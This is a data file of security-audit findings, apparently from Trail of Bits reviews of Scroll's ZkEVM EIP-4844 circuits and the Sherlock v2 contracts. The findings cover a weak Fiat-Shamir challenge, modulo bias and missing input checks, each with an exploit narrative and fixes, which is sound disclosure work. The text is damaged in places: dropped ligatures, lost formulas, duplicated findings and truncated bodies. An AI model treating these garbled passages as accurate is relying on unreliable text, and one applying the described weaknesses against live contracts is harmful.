Rotation::cur()); vec! [(byte_value, u8_table.into())] }); Figure 1.4: All cells in the byte column are restricted to the range [0,256). ( aggregator/src/aggregation/blob_data.rs#112115 ) Although this is not an exploitable issue in the case of the current use of BarycentricEvaluationConfig , it could easily lead to serious bugs if this circuit is used elsewhere, especially if the use assumes that the blob values are already constrained to 31 bytes. Recommendations Short term, remove these constraints or modify them to constrain the little-endian values to be in the range [0, 256). Long term, ensure that all cells are explicitly constrained to be in the correct range for their intended use. 17 Scroll ZkEVM EIP-", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Not Applicable"]}, {"title": "2. Public statement not included in the challenge preimage ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-scroll-4844-blob-securityreview.pdf", "body": "After the EIP-4844 update, the collection of L2 transactions within a chunk is no longer represented directly by a hash. Instead, data in the chunk is serialized and a polynomial is derived from that serialized form. That polynomial is provided in a blob on an L1 transaction, which is accessible to the smart contract via a hash of its KZG polynomial commitment. To ensure that the correct transactions are used in the ZkEVM execution proof, the smart contract and circuit each check the result of evaluating the polynomial at a random challenge point. If the result matches, the system treats that as evidence that the transactions being used in the proving step are the same ones chosen in the earlier commit phase. The random challenge point is generated via a Fiat-Shamir transform that includes all the chunk data that goes into the polynomial commitment. With a strong Fiat-Shamir transform, this random evaluation test is sucient to conclude that the commitment binds the prover to a single underlying polynomial: given two polynomials degree at most    (  ) for a random point of is at most , the chance that  (  ) =  (  ) over a eld  (  )  and   . However, the challenge generation in Scrolls ZkEVM circuit does not include the KZG commitment in its transcript, so the system uses the weak Fiat-Shamir transform. In this situation, an adversary who has control over the sequencer can choose a collection of chunks, ,...,  ,   ; calculate their corresponding challenge points and evaluation results, 2 1  ) ,  ),..., (  ,  ), (  ,  (  ; and publish a blob corresponding to the polynomial interpolating   2 2 1 1 through those points, instead of putting the correct chunk data in the blob. Then the prover can arbitrarily choose to generate a proof for any of those chunks. If the Scroll ZkEVM is deployed in a setting where a given batch can be nalized only once (e.g., if Scrolls ZkEVM is exclusively an L2 chain on top of Ethereum), then the impact is limited to maximum extractable value (MEV)style attacks on the on-chain contracts. A malicious sequencer could generate a malicious blob, wait for other parties to submit transactions based on one particular chunk, and then adaptively choose which chunk to nalize in order to manipulate the behavior of those later transactions. 18 Scroll ZkEVM EIP- However, the threat is more severe in a setting where the ZkEVM is deployed as a cross-chain bridge. Exploit Scenario The EIP-4844-enabled ZkEVM is used to create a cross-chain bridge between chain A and chain B, relying on blob commitments. Chad controls a malicious sequencer and gets both sides of the bridge to commit to a maliciously generated blob corresponding to two dierent chunks. Chad then submits a proof to each chain, nalizing a dierent chunk on each side of the bridge. The state of the bridge diverges, causing a loss of funds. Recommendations Short term, add the blob versioned hash to the challenge generation preimage. Long term, always evaluate new uses of cryptographic primitives to ensure that they preserve expected propertiesin this case, that the commitment is binding. When implementing the Fiat-Shamir transform, ensure that random challenge generation includes all data relevant to the statement being proven. References  Weak Fiat-Shamir Attacks on Modern Proof Systems 19 Scroll ZkEVM EIP-", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "3. Challenges are not uniformly random due to modulo bias ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-scroll-4844-blob-securityreview.pdf", "body": "Challenge points are generated by taking the Keccak hash of the challenge preimage, treating it as a 256-bit integer, and then reducing it modulo the BLS_MODULUS constant, which is a 255-bit value. This introduces a (small) bias toward smaller values, so the distribution of challenges is nonuniform. Ideally, challenges should always be selected uniformly at random from the space of possible challenges. In this case, the modulo bias is relatively small, and the entire space of values that is biased is suciently large that it should not cause a problem. However, deviations from a properly uniform random distribution should be avoided or at least documented whenever they appear. let challenge_digest = blob.get_challenge_digest(); let (_, challenge) = challenge_digest.div_mod(*BLS_MODULUS); Figure 3.1: Modular reduction ( aggregator/src/blob.rs#507508 ) Recommendations Short term, document the bias in the challenge generation. Long term, consider techniques for generating properly uniform random challenges. 20 Scroll ZkEVM EIP- 4. Initial o\u0000set is ignored in assign_data_bytes Severity: Informational Diculty: Not Applicable Type: Cryptography Finding ID: TOB-SCRL-BLOB-4 Target: zkevm-circuits/src/pi_circuit.rs", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Not Applicable"]}, {"title": "5. Witness generation and constraint generation are not separated ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-scroll-4844-blob-securityreview.pdf", "body": "The codebase implementing support for EIP-4844 contains several instances where constraints are dened in functions primarily responsible for witness assignment. Furthermore, in some cases, the witness generation code is divided into several functions. Accordingly, the code generating the constraints is sometimes spread across the codebase. This lack of modularity makes the codebase harder to audit. For example, the PI circuit must constrain the chunk_txbytes_hash_rlc witness assigned in the second section of the PI table to be equal to the chunk_txbytes_hash value assigned in the third section of the PI table. This constraint is buried in the middle of the assign_pi_bytes function. let chunk_txbytes_hash_cell = cells[RPI_CELL_IDX].clone(); let pi_bytes_rlc = cells[RPI_RLC_ACC_CELL_IDX].clone(); let pi_bytes_length = cells[RPI_LENGTH_ACC_CELL_IDX].clone(); // Copy chunk_txbytes_hash value from the previous section. region.constrain_equal( chunk_txbytes_hash_cell.cell(), chunk_txbytes_hash_rlc_cell.cell(), )?; // Assign row for validating lookup to check: // pi_hash == keccak256(rlc(pi_bytes)) pi_bytes_rlc.copy_advice( || \"pi_bytes_rlc in the rpi col\" , region, self .raw_public_inputs, offset, )?; Figure 5.1: The equality constraint is intertwined with the witness assignment. ( zkevm-circuits/src/pi_circuit.rs#12521269 ) 23 Scroll ZkEVM EIP- Recommendations Short term, refactor the codebase to separate witness generation and constraint generation into separate functions. Long term, review the codebase and dene an implementation protocol that ensures constraint generation is implemented in clearly identiable functions, allowing for better auditability of the codebase. 24 Scroll ZkEVM EIP- 6. Constraints are not su\u0000ciently documented Severity: Informational Diculty: Not Applicable Type: Cryptography Finding ID: TOB-SCRL-BLOB-6 Target: zkevm-circuits/src/tx_circuit.rs , zkevm-circuits/src/pi_circuit.rs , aggregator/src/aggregation/barycentric.rs , aggregator/src/blob.rs", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Not Applicable"]}, {"title": "3. Challenges are not uniformly random due to modulo bias ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-scroll-4844-blob-securityreview.pdf", "body": "Challenge points are generated by taking the Keccak hash of the challenge preimage, treating it as a 256-bit integer, and then reducing it modulo the BLS_MODULUS constant, which is a 255-bit value. This introduces a (small) bias toward smaller values, so the distribution of challenges is nonuniform. Ideally, challenges should always be selected uniformly at random from the space of possible challenges. In this case, the modulo bias is relatively small, and the entire space of values that is biased is suciently large that it should not cause a problem. However, deviations from a properly uniform random distribution should be avoided or at least documented whenever they appear. let challenge_digest = blob.get_challenge_digest(); let (_, challenge) = challenge_digest.div_mod(*BLS_MODULUS); Figure 3.1: Modular reduction ( aggregator/src/blob.rs#507508 ) Recommendations Short term, document the bias in the challenge generation. Long term, consider techniques for generating properly uniform random challenges. 20 Scroll ZkEVM EIP-", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Not Applicable"]}, {"title": "4. Initial o\u0000set is ignored in assign_data_bytes ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-scroll-4844-blob-securityreview.pdf", "body": "The assign_data_bytes function takes an offset parameter that marks the location where the prover assigns values of the data_bytes witness. While the oset is used to initialize the Random Linear Combination (RLC) accumulator, the initial oset value is ignored in some of the subsequent assignments. The RLC accumulator is initialized with a call to the assign_rlc_init function. This code writes xed constants in the PI table at the given oset. However, gure 4.1 shows that subsequent assignments of the q_block_context and q_tx_hashes columns ignore the initial oset. let ( mut offset , mut rpi_rlc_acc, mut rpi_length) = self .assign_rlc_init(region, offset)?; // Enable fixed columns for block context. for q_offset in public_data.q_block_context_start_offset()..public_data.q_block_context_end_offset() { region.assign_fixed( || \"q_block_context\" , self .q_block_context, q_offset , || Value::known(F::one()), )?; } Figure 4.1: Assignment of the q_block_context and q_tx_hashes functions at predened osets ( zkevm-circuits/src/pi_circuit.rs#919931 ) Fortunately, the hard-coded osets (e.g., the values returned by the q_block_context_start_offset and public_ data. q_block_context_end_offset functions) are compatible with the initial oset set to 0. However, any change to the codebase that changes the initial oset will be incompatible with the currently dened osets. Furthermore, potential issues may become tedious to debug due to incompatible oset values. 21 Scroll ZkEVM EIP- Recommendations Short term, ensure osets used in assign_data_bytes are compatible with any initial oset value. For example, the q_block_context_start_offset function could take an offset parameter and return offset + 1 . Long term, ensure that the codebase enforces assumed invariants. In particular, the code should robustly handle slight changes in initial oset values for table assignments. 22 Scroll ZkEVM EIP-", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Not Applicable"]}, {"title": "5. Witness generation and constraint generation are not separated ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-scroll-4844-blob-securityreview.pdf", "body": "The codebase implementing support for EIP-4844 contains several instances where constraints are dened in functions primarily responsible for witness assignment. Furthermore, in some cases, the witness generation code is divided into several functions. Accordingly, the code generating the constraints is sometimes spread across the codebase. This lack of modularity makes the codebase harder to audit. For example, the PI circuit must constrain the chunk_txbytes_hash_rlc witness assigned in the second section of the PI table to be equal to the chunk_txbytes_hash value assigned in the third section of the PI table. This constraint is buried in the middle of the assign_pi_bytes function. let chunk_txbytes_hash_cell = cells[RPI_CELL_IDX].clone(); let pi_bytes_rlc = cells[RPI_RLC_ACC_CELL_IDX].clone(); let pi_bytes_length = cells[RPI_LENGTH_ACC_CELL_IDX].clone(); // Copy chunk_txbytes_hash value from the previous section. region.constrain_equal( chunk_txbytes_hash_cell.cell(), chunk_txbytes_hash_rlc_cell.cell(), )?; // Assign row for validating lookup to check: // pi_hash == keccak256(rlc(pi_bytes)) pi_bytes_rlc.copy_advice( || \"pi_bytes_rlc in the rpi col\" , region, self .raw_public_inputs, offset, )?; Figure 5.1: The equality constraint is intertwined with the witness assignment. ( zkevm-circuits/src/pi_circuit.rs#12521269 ) 23 Scroll ZkEVM EIP- Recommendations Short term, refactor the codebase to separate witness generation and constraint generation into separate functions. Long term, review the codebase and dene an implementation protocol that ensures constraint generation is implemented in clearly identiable functions, allowing for better auditability of the codebase. 24 Scroll ZkEVM EIP-", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Not Applicable"]}, {"title": "6. Constraints are not su\u0000ciently documented ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-scroll-4844-blob-securityreview.pdf", "body": "In several cases, constraints are fairly complex, use several optimizations for eciency, and span several functions. The constraints implemented and the rationale for their design are often only partially documented. As a consequence of the lack of documentation, manual review for the soundness of circuits is a highly error-prone process. One such case is the transaction circuit that uses the is_chunk_bytes variable to mark rows that contain transaction data included in a chunk. The provided documentation states the following: is_chunk_bytes  A transactions bytes will be included in chunk bytes i the transaction is not padding (identied by a 0x0 caller address) and is not L1 message.  The column is constrained to be boolean. However, likely for eciency reasons, is_chunk_bytes is constrained only when certain conditions hold. The gate shown in gure 6.1 implements the constraint in the transaction circuit. The gate is activated only when the condition in the highlighted section evaluates to true . meta.create_gate( \"Degree reduction column: is_chunk_bytes\" , |meta| { let mut cb = BaseConstraintBuilder::default(); [...] cb.gate(and::expr([ meta.query_fixed(q_enable, Rotation::cur()), not::expr(meta.query_fixed(q_first, Rotation::cur())), not::expr(meta.query_advice(is_calldata, Rotation::cur())), 25 Scroll ZkEVM EIP- not::expr(meta.query_advice(is_access_list, Rotation::cur())), ])) }); Figure 6.1: Conditions under which is_chunk_bytes is constrained ( zkevm-circuits/src/tx_circuit.rs#17431761 ) The quoted documentation makes no mention of the condition involved in the constraints, supposedly leaving open the possibility of an unconstrained witness when the conditions do not hold. However, upon careful inspection of the dierent uses of is_chunk_bytes , it appears those conditional constraints are enforced wherever they matter, and thus, they eectively enforce the desired behavior. Missing or unclear documentation also aects other circuits in the scope of the review. For example, the accumulator column of the BlobDataConfig circuit is documented the following way:  accumulator: Advice column that serves multiple purposes. For the metadata section, it accumulates the big-endian bytes of numValidChunks or chunk[i].chunkSize. For the chunk data section, it increments the value by 1 until we encounter isBoundary is True, i.e. the end of that chunk , where the accumulator must hold the chunkSize. This column is used in a variety of documented ways, depending on several conditions. However, it is also used in an additional undocumented way in the digest RLC section, where a collection of constraints, applied in the assign method, causes the accumulator column to contain values from the chunk-size portion of the metadata section. These constraints in turn justify the seemingly redundant lookup in gure 6.2, where it may appear at rst glance that the columns are simply being looked up in themselves, when in fact this lookup is a primary way that various blob data consistency checks are enforced: // lookup chunk data digests in the \"digest rlc section\" of BlobDataConfig. meta.lookup_any( \"BlobDataConfig (chunk data digests in BlobDataConfig \\\"hash section\\\")\" , |meta| { let is_data = meta.query_selector(config.data_selector); let is_boundary = meta.query_advice(config.is_boundary, Rotation::cur()); // in the \"chunk data\" section when we encounter a chunk boundary let cond = is_data * is_boundary; let hash_section_table = vec! [ meta.query_selector(config.hash_selector), meta.query_advice(config.chunk_idx, Rotation::cur()), meta.query_advice(config.accumulator, Rotation::cur()), meta.query_advice(config.digest_rlc, Rotation::cur()), ]; [ 26 Scroll ZkEVM EIP- // hash section 1. expr(), meta.query_advice(config.chunk_idx, Rotation::cur()), // chunk idx meta.query_advice(config.accumulator, Rotation::cur()), // chunk len meta.query_advice(config.digest_rlc, Rotation::cur()), // digest rlc ] .into_iter() .zip(hash_section_table) .map(|(value, table)| (cond.expr() * value, table)) .collect() }, ); Figure 6.2: aggregator/src/aggregation/blob_data.rs#265292 Although we did not nd exploitable issues caused by these complex constraints during this engagement, similar patternsespecially with conditional constraintshave led to serious issues in previous engagements. For example, in the SHA-256 and EIP-1559 audit, the issues TOB-SCROLLSHA-4 and TOB-SCROLLSHA-6 were caused by witnesses that were only conditionally constrained and used in contexts where the conditions did not hold. Recommendations Short term, fully document the constraints of each circuit. Aim to capture both the high-level goal of each constraint, as well as the assumptions and optimizations used to actually implement each constraint. Doing so will improve the auditability and maintainability of the codebase. Long term, review all conditional constraints to ensure that conditionally constrained witnesses are not used in contexts where conditions do not hold. 27 Scroll ZkEVM EIP- 7. BarycentricEvaluationCong circuit returns zero on roots of unity Severity: Informational Diculty: Not Applicable Type: Data Validation Finding ID: TOB-SCRL-BLOB-7 Target: aggregator/src/aggregation/barycentric.rs", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Not Applicable"]}, {"title": "7. BarycentricEvaluationCong circuit returns zero on roots of unity ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-scroll-4844-blob-securityreview.pdf", "body": "The BarycentricEvaluationConfig circuit uses a special-case formula for evaluating a th root of given its evaluation at   1 ) , where 1 ), ...,  ( 0 ),  ( is an  (  )  (   polynomial unity, as shown below: Evaluating this formula at a power of sum is divided by zero, and then the overall result is multiplied by zeroeectively, one results in an indeterminate form, one term of the  term of the sum is multiplied by 0 0 . However, in the halo2-ecc library, which the Scroll ZkEVM uses for implementing nite eld operations, dividing by 0 always results in the value 0, rather than an unsatisable circuit, as shown in gure 7.1. fn divide ( & self , ctx: & mut Context<F>, a: & Self ::FieldPoint, b: & Self ::FieldPoint, ) -> Self ::FieldPoint { let quotient = self .divide_unsafe(ctx, a, b); let b_is_zero = self .is_zero(ctx, b); self .select(ctx, b, &quotient, &b_is_zero) } Figure 7.1: Fp::divide returns 0 when b equals 0. ( halo2-lib/halo2-ecc/src/fields/fp.rs#466475 ) Thus, when evaluating the above formula with the  th power of  , the  th value in the sum will be zero, the sum will have some result, and then the sum will be multiplied by    1  , which evaluates to 0. 28 Scroll ZkEVM EIP- In the context of EIP-4844 support, this circuit is used only with a random challenge point, and the chance of hitting a 4,096 th root of unity is negligible. However, if this circuit is reused in a context where the evaluation point is not random, this behavior may lead to unexpected errors. Recommendations Short term, specify and document the behavior of the BarycentricEvaluationConfig circuit when the challenge point is a root of unity. A simple modication would be to constrain z_to_blob_width_minus_one to be nonzero, which would cause the BarycentricEvaluationConfig circuit to be unsatisable on roots of unity. Long term, document or rule out edge-case behavior, especially when that behavior aects the context within which the component can be safely used. References  A quick barycentric evaluation tutorial 29 Scroll ZkEVM EIP- A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Not Applicable"]}, {"title": "1. Solidity compiler optimizations can be problematic ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Sherlockv2.pdf", "body": "Sherlock has enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed. Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past. A high-severity bug in the emscripten-generated solc-js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6. More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe. It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-jscauses a security vulnerability in the Sherlock contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "2. Certain functions lack zero address checks ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Sherlockv2.pdf", "body": "Certain functions fail to validate incoming arguments, so callers can accidentally set important state variables to the zero address. For example, the AaveV2Strategy contracts constructor function does not validate the aaveLmReceiver, which is the address that receives Aave rewards on calls to AaveV2Strategy.claimRewards. 39 40 41 42 43 44 45 46 47 } constructor(IAToken _aWant, address _aaveLmReceiver) { aWant = _aWant; // This gets the underlying token associated with aUSDC (USDC) want = IERC20(_aWant.UNDERLYING_ASSET_ADDRESS()); // Gets the specific rewards controller for this token type aaveIncentivesController = _aWant.getIncentivesController(); aaveLmReceiver = _aaveLmReceiver; Figure 2.1: managers/AaveV2Strategy.sol:39-47 If the aaveLmReceiver variable is set to the address zero, the Aave contract will revert with INVALID_TO_ADDRESS. This prevents any Aave rewards from being claimed for the designated token. The following functions are missing zero address checks:  Manager.setSherlockCoreAddress  AaveV2Strategy.sweep  SherDistributionManager.sweep  SherlockProtocolManager.sweep  Sherlock.constructor Exploit Scenario Bob deploys AaveV2Strategy with aaveLmReceiver set to the zero address. All calls to claimRewards revert. Recommendations Short term, add zero address checks on all function arguments to ensure that users cannot accidentally set incorrect values. Long term, use Slither, which will catch functions that do not have zero address checks.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "3. updateYieldStrategy could leave funds in the old strategy ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Sherlockv2.pdf", "body": "The updateYieldStrategy function sets a new yield strategy manager contract without calling yieldStrategy.withdrawAll() on the old strategy, potentially leaving funds in it. 257 // Sets a new yield strategy manager contract 258 /// @notice Update yield strategy 259 /// @param _yieldStrategy News address of the strategy 260 /// @dev try a yieldStrategyWithdrawAll() on old, ignore failure 261 function updateYieldStrategy(IStrategyManager _yieldStrategy) external override onlyOwner { 262 263 264 265 266 yieldStrategy = _yieldStrategy; 267 } if (address(_yieldStrategy) == address(0)) revert ZeroArgument(); if (yieldStrategy == _yieldStrategy) revert InvalidArgument(); emit YieldStrategyUpdated(yieldStrategy, _yieldStrategy); Figure 3.1: contracts/Sherlock.sol:257-267 Even though one could re-add the old strategy to recover the funds, this issue could cause stakers and the protocols insured by Sherlock to lose trust in the system. This issue has a signicant impact on the result of totalTokenBalanceStakers, which is used when calculating the shares in initialStake. totalTokenBalanceStakers uses the balance of the yield strategy. If the balance is missing the funds that should have been withdrawn from a previous strategy, the result will be incorrect. return 151 function totalTokenBalanceStakers() public view override returns (uint256) { 152 153 token.balanceOf(address(this)) + 154 155 sherlockProtocolManager.claimablePremiums(); 156 } yieldStrategy.balanceOf() + Figure 3.2: contracts/Sherlock.sol:151-156 uint256 _amount, uint256 _period, address _receiver 483 function initialStake( 484 485 486 487 ) external override whenNotPaused returns (uint256 _id, uint256 _sher) { ... 501 502 stakeShares_ = (_amount * totalStakeShares_) / (totalTokenBalanceStakers() - _amount); 503 // If this is the first stake ever, we just mint stake shares equal to the amount of USDC staked 504 else stakeShares_ = _amount; if (totalStakeShares_ != 0) Figure 3.3: contracts/Sherlock.sol:483-504 Exploit Scenario Bob, the owner of the Sherlock contract, calls updateYieldStrategy with a new strategy. Eve calls initialStake and receives more shares than she is due because totalTokenBalanceStakers returns a signicantly lower balance than it should. Bob notices the missing funds, calls updateYieldStrategy with the old strategy and then yieldStrategy.WithdrawAll to recover the funds, and switches back to the new strategy. Eves shares now have notably more value. Recommendations Short term, in updateYieldStrategy, add a call to yieldStrategy.withdrawAll() on the old strategy. Long term, when designing systems that store funds, use extensive unit testing and property-based testing to ensure that funds cannot become stuck.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "4. Pausing and unpausing the system may not be possible when removing or replacing connected contracts ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Sherlockv2.pdf", "body": "The Sherlock contract allows all of the connected contracts to be paused or unpaused at the same time. However, if the sherDistributionManager contract is removed, or if any of the connected contracts are replaced when the system is paused, it might not be possible to pause or unpause the system. function removeSherDistributionManager() external override onlyOwner { if (address(sherDistributionManager) == address(0)) revert InvalidConditions(); emit SherDistributionManagerUpdated( sherDistributionManager, ISherDistributionManager(address(0)) ); delete sherDistributionManager; 206 207 208 209 210 211 212 213 214 } Figure 4.1: contracts/Sherlock.sol:206-214 Of all the connected contracts, the only one that can be removed is the sherDistributionManager contract. On the other hand, all of the connected contracts can be replaced through an update function. function pause() external onlyOwner { _pause(); yieldStrategy.pause(); sherDistributionManager.pause(); sherlockProtocolManager.pause(); sherlockClaimManager.pause(); 302 303 304 305 306 307 308 } 309 310 311 /// @notice Unpause external functions in all contracts function unpause() external onlyOwner { 312 313 314 315 316 317 } _unpause(); yieldStrategy.unpause(); sherDistributionManager.unpause(); sherlockProtocolManager.unpause(); sherlockClaimManager.unpause(); Figure 4.2: contracts/Sherlock.sol:302-317 If the sherDistributionManager contract is removed, a call to Sherlock.pause will revert, as it is attempting to call the zero address. If sherDistributionManager is removed while the system is paused, then a call to Sherlock.unpause will revert for the same reason. If any of the contracts is replaced while the system is paused, the replaced contract will be in an unpaused state while the other contracts are still paused. As a result, a call to Sherlock.unpause will revert, as it is attempting to unpause an already unpaused contract. Exploit Scenario Bob, the owner of the Sherlock contract, pauses the system to replace the sherlockProtocolManager contract, which contains a bug. Bob deploys a new sherlockProtocolManager contract and calls updateSherlockProtocolManager to set the new address in the Sherlock contract. To unpause the system, Bob calls Sherlock.unpause, which reverts because sherlockProtocolManager is already unpaused. Recommendations Short term, add conditional checks to the Sherlock.pause and Sherlock.unpause functions to check that a contract is either paused or unpaused, as expected, before attempting to update its state. For sherDistributionManager, the check should verify that the contract to be paused or unpaused is not the zero address. Long term, for pieces of code that depend on the states of multiple contracts, implement unit tests that cover each possible combination of contract states.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "5. SHER reward calculation uses confusing six-decimal SHER reward rate ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Sherlockv2.pdf", "body": "The reward calculation in calcReward uses a six-decimal SHER reward rate value. This might confuse readers and developers of the contracts because the SHER token has 18 decimals, and the calculated reward will also have 18 decimals. Also, this value does not allow the SHER reward rate to be set below 0.000001000000000000 SHER. function calcReward( 89 90 91 92 93 ) public view override returns (uint256 _sher) { uint256 _tvl, uint256 _amount, uint256 _period 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 [..] // If there are some max rewards available... if (maxRewardsAvailable != 0) { // And if the entire stake is still within the maxRewardsAvailable amount if (_amount <= maxRewardsAvailable) { // Then the entire stake amount should accrue max SHER rewards return (_amount * maxRewardsRate * _period) * DECIMALS; } else { // Otherwise, the stake takes all the maxRewardsAvailable left  // We add the maxRewardsAvailable amount to the TVL (now _tvl _tvl += maxRewardsAvailable; // We subtract the amount of the stake that received max rewards _amount -= maxRewardsAvailable; // We accrue the max rewards available at the max rewards  // This could be: $20M of maxRewardsAvailable which gets  // Calculation continues after this _sher += (maxRewardsAvailable * maxRewardsRate * _period) * DECIMALS; } } // If there are SHER rewards still available  if (slopeRewardsAvailable != 0) { _sher += (((zeroRewardsStartTVL - position) * _amount * maxRewardsRate * _period) / (zeroRewardsStartTVL - maxRewardsEndTVL)) * DECIMALS; 144 145 146 147 148 149 } } Figure 5.1: contracts/managers/SherDistributionManager.sol:89-149 In the reward calculation, the 6-decimal maxRewardsRate is rst multiplied by _amount and _period, resulting in a 12-decimal intermediate product. To output a nal 18-decimal product, this 12-decimal product is multiplied by DECIMALS to add 6 decimals. Although this leads to a correct result, it would be clearer to use an 18-decimal value for maxRewardsRate and to divide by DECIMALS at the end of the calculation. // using 6 decimal maxRewardsRate (10e6 * 1e6 * 10) * 1e6 = 100e18 = 100 SHER // using 18 decimal maxRewardsRate (10e6 * 1e18 * 10) / 1e6 = 100e18 = 100 SHER Figure 5.2: Comparison of a 6-decimal and an 18-decimal maxRewardsRate Exploit Scenario Bob, a developer of the Sherlock protocol, writes a new version of the SherDistributionManager contract that changes the reward calculation. He mistakenly assumes that the SHER maxRewardsRate has 18 decimals and updates the calculation incorrectly. As a result, the newly calculated reward is incorrect. Recommendations Short term, use an 18-decimal value for maxRewardsRate and divide by DECIMALS instead of multiplying. Long term, when implementing calculations that use the rate of a given token, strive to use a rate variable with the same number of decimals as the token. This will prevent any confusion with regard to decimals, which might lead to introducing precision bugs when updating the contracts.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "6. A claim cannot be paid out or escalated if the protocol agent changes after the claim has been initialized ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Sherlockv2.pdf", "body": "The escalate and payoutClaim functions can be called only by the protocol agent that started the claim. Therefore, if the protocol agent role is reassigned after a claim is started, the new protocol agent will be unable to call these functions and complete the claim. function escalate(uint256 _claimID, uint256 _amount) external override nonReentrant whenNotPaused 388 389 390 391 392 393 { 394 395 396 397 398 399 400 401 402 403 if (_amount < BOND) revert InvalidArgument(); // Gets the internal ID of the claim bytes32 claimIdentifier = publicToInternalID[_claimID]; if (claimIdentifier == bytes32(0)) revert InvalidArgument(); // Retrieves the claim struct Claim storage claim = claims_[claimIdentifier]; // Requires the caller to be the protocol agent if (msg.sender != claim.initiator) revert InvalidSender(); Figure 6.1: contracts/managers/SherlockClaimManager.sol:388-403 Due to this scheme, care should be taken when updating the protocol agent. That is, the protocol agent should not be reassigned if there is an existing claim. However, if the protocol agent is changed when there is an existing claim, the protocol agent role could be transferred back to the original protocol agent to complete the claim. Exploit Scenario Alice is the protocol agent and starts a claim. Alice transfers the protocol agent role to Bob. The claim is approved by SPCC and can be paid out. Bob calls payoutClaim, but the transaction reverts. Recommendations Short term, update the comment in the escalate and payoutClaim functions to state that the caller needs to be the protocol agent that started the claim, and clearly describe this requirement in the protocol agent documentation. Alternatively, update the check to verify that msg.sender is the current protocol agent rather than specically the protocol agent who initiated the claim. Long term, review and document the eects of the reassignment of privileged roles on the systems state transitions. Such a review will help uncover cases in which the reassignment of privileged roles causes issues and possibly a denial of service to (part of) the system.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "7. Missing input validation in setMinActiveBalance could cause a confusing event to be emitted ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Sherlockv2.pdf", "body": "The setMinActiveBalance functions input validation is incomplete: it should check that the minActiveBalance has not been set to its existing value, but this check is missing. Additionally, if the minActiveBalance is set to its existing value, the emitted MinBalance event will indicate that the old and new values are identical. This could confuse systems monitoring the contract that expect this event to be emitted only when the minActiveBalance changes. function setMinActiveBalance(uint256 _minActiveBalance) external override onlyOwner { // Can't set a value that is too high to be reasonable require(_minActiveBalance < MIN_BALANCE_SANITY_CEILING, 'INSANE'); emit MinBalance(minActiveBalance, _minActiveBalance); minActiveBalance = _minActiveBalance; 422 423 424 425 426 427 428 } Figure 7.1: contracts/managers/SherlockProtocolManager.sol:422-428 Exploit Scenario An o-chain monitoring system controlled by the Sherlock protocol is listening for events that indicate that a contract conguration value has changed. When such events are detected, the monitoring system sends an email to the admins of the Sherlock protocol. Alice, a contract owner, calls setMinActiveBalance with the existing minActiveBalance as input. The o-chain monitoring system detects the emitted event and noties the Sherlock protocol admins. The Sherlock protocol admins are confused since the value did not change. Recommendations Short term, add input validation that causes setMinActiveBalance to revert if the proposed minActiveBalance value equals the current value. Long term, document and test the expected behavior of all the systems events. Consider using a blockchain-monitoring system to track any suspicious behavior in the contracts.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "8. payoutClaims calling of external contracts in a loop could cause a denial of service ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Sherlockv2.pdf", "body": "The payoutClaim function uses a loop to call the PreCorePayoutCallback function on a list of external contracts. If any of these calls reverts, the entire payoutClaim function reverts, and, hence, the transaction reverts. This may not be the desired behavior; if that is the case, a denial of service would prevent claims from being paid out. for (uint256 i; i < claimCallbacks.length; i++) { claimCallbacks[i].PreCorePayoutCallback(protocol, _claimID, amount); 499 500 501 } Figure 8.1: contracts/managers/SherlockClaimManager.sol:499-501 The owner of the SherlockClaimManager contract controls the list of contracts on which the PreCorePayoutCallback function is called. The owner can add or remove contracts from this list at any time. Therefore, if a contract is causing unexpected reverts, the owner can x the problem by (temporarily) removing that contract from the list. It might be expected that some of these calls revert and cause the entire transaction to revert. However, the external 